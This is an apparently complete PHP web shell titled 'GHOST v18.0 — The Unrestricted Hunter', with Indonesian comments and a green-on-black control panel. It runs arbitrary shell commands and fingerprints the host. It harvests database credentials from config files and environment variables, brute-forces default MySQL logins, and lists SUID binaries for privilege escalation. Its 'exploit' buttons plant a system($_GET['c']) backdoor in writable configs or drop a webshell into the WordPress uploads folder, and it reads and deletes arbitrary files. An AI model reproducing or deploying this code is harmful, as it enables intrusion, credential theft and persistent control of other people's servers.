<?php
/**
 * GHOST v18.0 — The Unrestricted Hunter
 */
@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// ==========================================
// ENGINE EKSEKUSI (Anti-Crash)
// ==========================================
function g_exec($cmd, $timeout = 15) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
        if (!function_exists($m)) continue;
        try {
            if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
            if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
            if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
        } catch (Throwable $e) { continue; }
    }
    return "[-] Blocked.";
}

function g_read($path) {
    if (!@is_file($path) || @filesize($path) === 0) return "";
    try {
        if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
        return g_exec('cat ' . escapeshellarg($path));
    } catch (Throwable $e) { return ""; }
}

// ==========================================
// 1. FINGERPRINT
// ==========================================
function g_fingerprint() {
    $os = trim(g_exec('uname -a'));
    $cpanel = 'Not Found';
    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')), 'cPanel'=>$cpanel];
}

// ==========================================
// 2. DEEP INSPECTOR (Mendalam & Cerdas)
// ==========================================
function g_deep_scan() {
    $vulns = [];
    // Cari semua file PHP dan file teks yang mencurigakan (termasuk subfolder dalam)
    $files = g_exec("find " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.txt' -o -name '*.js' -o -name '*.html' -o -name '*.jpg' -o -name '*.png' -o -name '*.env' \) 2>/dev/null");
    
    if (!trim($files) || strpos($files, '[-] Blocked') !== false) return [];

    $list = explode("\n", trim($files));
    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan'];
    
    foreach ($list as $path) {
        if (!$path) continue;
        $c = g_read($path);
        $size = @filesize($path);
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = []; $type = '';
        
        // 1. Pengecekan Backdoor Kompleks
        if (preg_match('/eval\s*\(\s*(base64_decode|\$_POST|\$_GET|\$_REQUEST)/i', $c)) {
            $type = 'Obfuscated Backdoor'; $findings[] = "Menggunakan eval() + Input User.";
        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
            $type = 'Direct Webshell'; $findings[] = "Eksekusi perintah shell langsung.";
        } elseif (preg_match('/(\$[a-zA-Z0-9_]+\s*\(\s*\$_(POST|GET|REQUEST))/i', $c) && !preg_match('/(function|class)/i', $c)) {
            $type = 'Dynamic Call RCE'; $findings[] = "Memanggil fungsi dinamis dari input user.";
        } elseif (in_array($ext, ['jpg','png']) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $findings[] = "Gambar berisi kode PHP (Bypass Upload).";
        } elseif (strpos($path, '.php') !== false && strlen(trim($c)) < 15 && $size < 100) {
            $type = 'Empty Shell'; $findings[] = "File PHP kosong / sangat pendek.";
        } elseif (strpos($c, 'preg_replace') !== false && strpos($c, '/e') !== false) {
            $type = 'Preg_Replace RCE'; $findings[] = "Penggunaan modifier /e (legacy RCE).";
        }
        
        // 2. Pengecekan Konten Ilegal
        $found_kw = [];
        foreach ($illegal_kw as $k) { if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; }
        if ($found_kw) {
            if($type==='') $type='Illegal Content';
            $findings[] = "Keyword: " . implode(',', array_unique($found_kw));
        }

        if ($type !== '') {
            $vulns[] = ['file'=>$path, 'type'=>$type, 'desc'=>implode(' | ', $findings)];
        }
    }
    return $vulns;
}

// ==========================================
// 3. DB HARVEST (Multi-Fallback & Hack)
// ==========================================
function g_db_harvest() {
    $logs = []; $info = [];
    
    // Metode A: Cari Config Standard
    foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            if ($u[1] && $p[1]) { $logs[] = "[+] Ditemukan Config: $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
        }
    }

    // Metode B: Cari di Environment Variables (Biasa di Docker/LiteSpeed)
    if (empty($info)) {
        $logs[] = "[*] Mencari di Environment Variables...";
        $env = g_exec("env | grep -iE 'DB_|MYSQL_|DATABASE_'");
        if (trim($env)) { $logs[] = "[+] ENV ditemukan:\n$env"; }
    }

    // Metode C: Scanning langsung dengan Mencari string sambungan DB
    if (empty($info)) {
        $logs[] = "[*] Grep password di file PHP...";
        $grep = g_exec("grep -rEil 'mysqli_connect|mysql_connect|new PDO' " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " 2>/dev/null | head -n 5");
        if (trim($grep)) {
            $logs[] = "[+] File koneksi ditemukan:\n$grep";
            foreach (explode("\n", trim($grep)) as $file) {
                $c = g_read($file);
                if (preg_match('/pass(?:word)?[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)/i', $c, $p)) {
                    $info = ['pass'=>$p[1]]; $logs[] = "[!] Kemungkinan Password: " . $p[1]; break;
                }
            }
        }
    }

    // Metode D: Hack database via default credential / config .my.cnf
    if (empty($info)) {
        $logs[] = "[*] Brute-force default MySQL (localhost)...";
        foreach ([['root',''],['root','root'],['admin','']] as $d) {
            $conn = @mysqli_connect('localhost', $d[0], $d[1], '', 3306, null, ['connect_timeout'=>2]);
            if ($conn) { $info = ['user'=>$d[0], 'pass'=>$d[1]]; $logs[] = "[!] BERHASIL login default: {$d[0]}:{$d[1]}"; break; }
        }
    }

    // Final: Dump
    if (!empty($info)) {
        $logs[] = "[*] Menghubungkan ke Database...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'] ?? '', '', 3306, null, ['connect_timeout'=>3]);
        if ($conn) {
            $logs[] = "[!] KONEKSI BERHASIL!";
            $q = @mysqli_query($conn, "SHOW DATABASES");
            while($r = mysqli_fetch_array($q)) { $logs[] = "DB: ".$r[0]; }
        } else {
            $logs[] = "[-] Gagal konek. " . mysqli_connect_error();
        }
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ==========================================
// 4. VULNERABILITY EXPLORER & EXPLOIT
// ==========================================
function g_vuln_scan() {
    $v = [];
    // 1. Config World-Writable (Bisa ditanami backdoor)
    foreach (['wp-config.php', '.env'] as $f) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$f") && @is_writable($GLOBALS['GHOST_ROOT']."/$f")) {
            $v[] = ['type'=>'WRITEABLE_CONFIG', 'path'=>$f, 'desc'=>'File konfigurasi bisa ditimpa (RCE).'];
        }
    }
    // 2. Uploads Directory (Bisa upload shell)
    if (@is_dir($GLOBALS['GHOST_ROOT'].'/wp-content/uploads') && !@is_file($GLOBALS['GHOST_ROOT'].'/wp-content/uploads/.htaccess')) {
        $v[] = ['type'=>'UNPROTECTED_UPLOADS', 'path'=>'wp-content/uploads', 'desc'=>'Folder uploads terbuka, bisa eksekusi PHP.'];
    }
    // 3. SUID Binaries (Privilege Escalation)
    $suid = g_exec("find /usr/bin /bin -perm -4000 2>/dev/null | head -n 5");
    if (trim($suid)) {
        foreach (explode("\n", trim($suid)) as $s) {
            if ($s) $v[] = ['type'=>'SUID_BINARY', 'path'=>$s, 'desc'=>'Binary SUID dapat digunakan untuk eskalasi root.'];
        }
    }
    return $v;
}

function g_vuln_exploit($type, $path) {
    if ($type === 'WRITEABLE_CONFIG') {
        $payload = "\n<?php if(isset(\$_GET['c'])) system(\$_GET['c']); ?>";
        if (@file_put_contents($GLOBALS['GHOST_ROOT'].'/'.$path, $payload, FILE_APPEND)) return "Backdoor RCE ditanam di $path";
    }
    if ($type === 'UNPROTECTED_UPLOADS') {
        $shell = "<?php system(\$_GET['c']); ?>";
        $file = $GLOBALS['GHOST_ROOT'].'/wp-content/uploads/ghost_'.rand(100,999).'.php';
        if (@file_put_contents($file, $shell)) return "Webshell berhasil di-upload ke ".str_replace($GLOBALS['GHOST_ROOT'],'',$file);
    }
    return "Eksekusi eksploitasi tidak tersedia untuk tipe ini.";
}

// ==========================================
// ROUTER
// ==========================================
$act = $_POST['act'] ?? '';
if ($act) {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'deep_scan') echo json_encode(g_deep_scan());
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'vuln_scan') echo json_encode(g_vuln_scan());
    elseif ($act === 'vuln_exploit') echo json_encode(['msg'=>g_vuln_exploit($_POST['type'], $_POST['path'])]);
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
    elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v18.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>
<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Inspector (Advanced)</h2>
    <button onclick="run('deep_scan','deep-result')">Scan All Files</button>
    <div id="deep-result-table"></div>
    <pre id="deep-result" style="display:none;"></pre>
</div>

<div class="box">
    <h2>[+] Database Harvest (Multi-Fallback)</h2>
    <button onclick="run('db_scan','db-result')">Scan & Hack DB</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Vulnerability Explorer & Exploiter</h2>
    <button onclick="run('vuln_scan','vuln-result')">Scan Vulnerabilities</button>
    <div id="vuln-result-table"></div>
    <pre id="vuln-result" style="display:none;"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    const text = await r.text();
    try { return JSON.parse(text); } 
    catch(e) { return {err: "Server crash / timeout. HTTP "+r.status}; }
}

async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (d.err) { document.getElementById(target).innerText = 'Error: ' + d.err; return; }
        
        if (act === 'deep_scan') renderScan(d);
        else if (act === 'vuln_scan') renderVuln(d);
        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

// RENDER SCAN
function renderScan(mal) {
    document.getElementById('deep-result').innerText = `Selesai. ${mal.length} file berbahaya.`;
    if (!mal.length) return;
    let h = `<table><tr><th>Klasifikasi</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
    mal.forEach(x => {
        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
            <td><button onclick="viewFile('${encodeURIComponent(x.file)}')">View</button>
            <button class="btn-red" onclick="delFile('${encodeURIComponent(x.file)}')">Delete</button></td></tr>`;
    });
    h += `</table>`;
    document.getElementById('deep-result-table').innerHTML = h;
}

// RENDER VULN
function renderVuln(v) {
    document.getElementById('vuln-result').innerText = `Selesai. ${v.length} celah ditemukan.`;
    if (!v.length) return;
    let h = `<table><tr><th>Tipe</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
    v.forEach(x => {
        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
            <td><button class="btn-red" onclick="exploit('${esc(x.type)}', '${encodeURIComponent(x.path)}')">Exploit</button></td></tr>`;
    });
    h += `</table>`;
    document.getElementById('vuln-result-table').innerHTML = h;
}

async function exploit(type, encPath) {
    if(!confirm('Eksploitasi celah ini?')) return;
    const d = await api('vuln_exploit', {type: type, path: decodeURIComponent(encPath)});
    alert(d.msg || d.err);
}

async function viewFile(enc) {
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    const d = await api('read_file', {path: decodeURIComponent(enc)});
    document.getElementById('modal-text').innerText = d.content ? d.content.slice(0, 5000) : 'Error/Gagal.';
}

async function delFile(enc) {
    if(!confirm('Hapus file ini?')) return;
    await api('del_file', {path: decodeURIComponent(enc)});
    run('deep_scan', 'deep-result');
}

async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+(d.out || d.err);
}
</script>
</body>
</html>
